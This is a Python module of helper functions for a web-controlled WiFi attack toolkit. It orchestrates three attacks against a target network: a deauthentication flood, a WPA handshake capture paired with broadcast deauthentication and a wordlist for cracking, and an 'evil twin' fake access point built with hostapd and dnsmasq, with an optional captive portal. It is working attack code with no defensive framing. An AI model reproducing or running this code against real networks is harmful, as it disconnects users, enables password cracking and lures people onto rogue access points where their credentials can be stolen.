"""
Helper functions for attack operations.
"""

import os
import time
import sys
import threading
import subprocess

# Add the project root directory to Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../')))

from web.shared import config, logger, log_message
from utils.network_utils import set_monitor_mode, set_managed_mode
from attacks.deauth_attack import deauth_worker , deauth_worker_for_handshake
from attacks.capture_attack import capture_worker
from attacks.evil_twin import create_hostapd_config, create_dnsmasq_config, setup_fake_ap_network
from web.socket_io import socketio

def update_attack_progress(progress):
    """
    Update the attack progress and emit a WebSocket event.
    
    Args:
        progress (int): The progress percentage (0-100)
    """
    from web.shared import attack_state
    attack_state['progress'] = progress
    socketio.emit('attack_progress', {'progress': progress})

def add_log_message(message):
    """
    Add a log message and emit a WebSocket event.
    
    Args:
        message (str): The log message
    """
    log_message(message)
    socketio.emit('attack_log', {'message': message})

def launch_deauth_attack(network, attack_config):
    """
    Launch a deauthentication attack against the specified network.
    
    Args:
        network (dict): The target network information
        attack_config (dict): Configuration for the attack
    """
    # Extract parameters
    bssid = network['bssid']
    channel = int(network['channel'])
    client = attack_config.get('client', 'FF:FF:FF:FF:FF:FF')
    count = attack_config.get('count', 10)
    interval = attack_config.get('interval', 0.1)
    
    # Check root privileges
    if not os.geteuid() == 0:
        add_log_message("Warning: Not running as root. Deauthentication attacks require root privileges.")
        
    # Set monitor mode using subprocess and sudo
    try:
        add_log_message(f"Setting {config['interface']} to monitor mode...")
        subprocess.run(['sudo', 'ip', 'link', 'set', config['interface'], 'down'], check=True)
        subprocess.run(['sudo', 'iw', 'dev', config['interface'], 'set', 'type', 'monitor'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', config['interface'], 'up'], check=True)
        add_log_message(f"Interface {config['interface']} set to monitor mode")
    except subprocess.CalledProcessError as e:
        add_log_message(f"Error setting monitor mode: {e}")
        raise
    
    # Set channel using subprocess
    try:
        add_log_message(f"Setting channel to {channel}...")
        subprocess.run(['sudo', 'iw', 'dev', config['interface'], 'set', 'channel', str(channel)], check=True)
        add_log_message(f"Channel set to {channel}")
    except subprocess.CalledProcessError as e:
        add_log_message(f"Error setting channel: {e}")
        # Try with iwconfig as fallback
        try:
            subprocess.run(['sudo', 'iwconfig', config['interface'], 'channel', str(channel)], check=True)
            add_log_message(f"Channel set to {channel} (using iwconfig)")
        except subprocess.CalledProcessError as e2:
            add_log_message(f"Error setting channel with iwconfig: {e2}")
            set_managed_mode(config['interface'])
            raise
    
    # Start deauth thread
    from web.shared import attack_state
    deauth_thread = threading.Thread(
        target=deauth_worker,
        args=(bssid, client, config['interface'], count, interval, attack_state['stop_event']),
        daemon=True
    )
    
    attack_state['threads'].append(deauth_thread)
    deauth_thread.start()
    add_log_message(f"Deauthentication attack started against {bssid}")
    update_attack_progress(10)  # Initial progress

def launch_handshake_attack(network, attack_config):
    """
    Launch a handshake capture attack against the specified network.
    
    Args:
        network (dict): The target network information
        attack_config (dict): Configuration for the attack
    """
    # Extract parameters
    bssid = network['bssid']
    channel = int(network['channel'])
    duration = attack_config.get('duration', 5)
    wordlist = attack_config.get('wordlist', config['wordlist'])
    
    # Create output directory
    safe_bssid = bssid.replace(':', '-')
    output_dir = os.path.join(config['output_dir'], safe_bssid)
    os.makedirs(output_dir, exist_ok=True)
    cap_file = os.path.join(output_dir, "capture-01.cap")
    
    # Set monitor mode
    set_monitor_mode(config['interface'])
    add_log_message(f"Interface {config['interface']} set to monitor mode")
    update_attack_progress(10)
    
    # Start capture thread
    from web.shared import attack_state, stats
    capture_thread = threading.Thread(
        target=capture_worker,
        args=(bssid, channel, config['interface'], duration, 
              os.path.join(output_dir, "capture"), cap_file, wordlist, 
              attack_state['stop_event']),
        daemon=True
    )
    
    # Start deauth thread
    deauth_thread = threading.Thread(
        target=deauth_worker_for_handshake,
        args=(bssid, "FF:FF:FF:FF:FF:FF", config['interface'], 10, 0.1, attack_state['stop_event']),
        daemon=True
    )
    
    attack_state['threads'].extend([capture_thread, deauth_thread])
    capture_thread.start()
    add_log_message("Handshake capture started")
    update_attack_progress(20)
    
    # Wait a bit before starting deauth
    time.sleep(2)
    deauth_thread.start()
    add_log_message("Deauthentication flood started")
    update_attack_progress(30)
    
    # Update stats when a handshake is captured
    stats['captures_count'] += 1

def launch_evil_twin_attack(network, attack_config):
    """
    Launch an evil twin attack against the specified network.
    
    Args:
        network (dict): The target network information
        attack_config (dict): Configuration for the attack
    """
    # Extract parameters
    bssid = network['bssid']
    ssid = network['essid']
    channel = attack_config.get('channel', int(network['channel']))
    captive_portal = attack_config.get('captive_portal', False)
    
    # Create output directory
    safe_ssid = "".join(c if c.isalnum() else "_" for c in ssid)
    output_dir = os.path.join(config['output_dir'], "evil_twin", safe_ssid)
    os.makedirs(output_dir, exist_ok=True)
    
    # Set managed mode
    set_managed_mode(config['interface'])
    add_log_message(f"Interface {config['interface']} set to managed mode")
    update_attack_progress(10)
    
    # Create config files
    hostapd_conf = create_hostapd_config(config['interface'], ssid, channel, output_dir)
    dnsmasq_conf = create_dnsmasq_config(config['interface'], output_dir)
    
    if hostapd_conf and dnsmasq_conf:
        # Setup network
        setup_fake_ap_network(config['interface'])
        add_log_message("Fake AP network setup complete")
        update_attack_progress(30)
        
        # Start hostapd
        from web.shared import attack_state
        hostapd_thread = threading.Thread(
            target=run_hostapd,
            args=(hostapd_conf, attack_state['stop_event']),
            daemon=True
        )
        
        # Start dnsmasq
        dnsmasq_thread = threading.Thread(
            target=run_dnsmasq,
            args=(dnsmasq_conf, attack_state['stop_event']),
            daemon=True
        )
        
        attack_state['threads'].extend([hostapd_thread, dnsmasq_thread])
        hostapd_thread.start()
        dnsmasq_thread.start()
        add_log_message("Evil Twin attack started")
        update_attack_progress(50)
        
        # Start captive portal if enabled
        if captive_portal:
            add_log_message("Starting captive portal")
            update_attack_progress(70)
        else:
            add_log_message("Captive portal disabled")
    else:
        add_log_message("Failed to create required configuration files")
        raise Exception("Failed to create required configuration files")

def run_hostapd(config_file, stop_event):
    """
    Run hostapd with the specified configuration file.
    
    Args:
        config_file (str): Path to the hostapd configuration file
        stop_event (threading.Event): Event to signal when to stop
    """
    try:
        add_log_message(f"Starting hostapd with config: {config_file}")
        process = os.popen(f"hostapd {config_file}")
        
        while not stop_event.is_set():
            line = process.readline()
            if line:
                add_log_message(f"[hostapd] {line.strip()}")
            time.sleep(0.1)
            
        process.close()
    except Exception as e:
        add_log_message(f"Error in hostapd: {e}")

def run_dnsmasq(config_file, stop_event):
    """
    Run dnsmasq with the specified configuration file.
    
    Args:
        config_file (str): Path to the dnsmasq configuration file
        stop_event (threading.Event): Event to signal when to stop
    """
    try:
        add_log_message(f"Starting dnsmasq with config: {config_file}")
        process = os.popen(f"dnsmasq -C {config_file} -d")
        
        while not stop_event.is_set():
            line = process.readline()
            if line:
                add_log_message(f"[dnsmasq] {line.strip()}")
            time.sleep(0.1)
            
        process.close()
    except Exception as e:
        add_log_message(f"Error in dnsmasq: {e}")
